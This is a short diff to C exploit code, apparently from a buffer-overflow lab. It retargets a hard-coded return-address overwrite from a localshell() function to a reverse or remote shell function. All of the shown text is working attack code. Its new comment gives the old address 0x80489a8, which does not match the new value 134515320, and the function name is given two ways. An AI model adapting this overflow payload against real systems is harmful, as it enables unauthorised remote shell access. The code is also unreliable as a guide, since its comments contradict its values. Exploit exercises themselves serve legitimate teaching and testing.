@@ -52,14 +52,13 @@ send_message(int s)
 	char response_buffer[BLENGTH];
 	int numints = 140;
 	int dummy_addr = 134515092; // integer value of 0x8048994 which is the location of the function dummy()
-        int localshell_addr = 134515112; // integer value of 0x80489a8 which is the location of the function localshell()
-
+        int reverseshell_addr = 134515320; // integer value of 0x80489a8 which is the location of the function remoteshell()
 
 	char *buff, *ptr;
 	long *addr_ptr, addr;
 	int i;
 	
-	addr = localshell_addr;
+	addr = reverseshell_addr;
 	printf("Using address: 0x%x\n", addr);
 	
 	ptr = response_buffer;
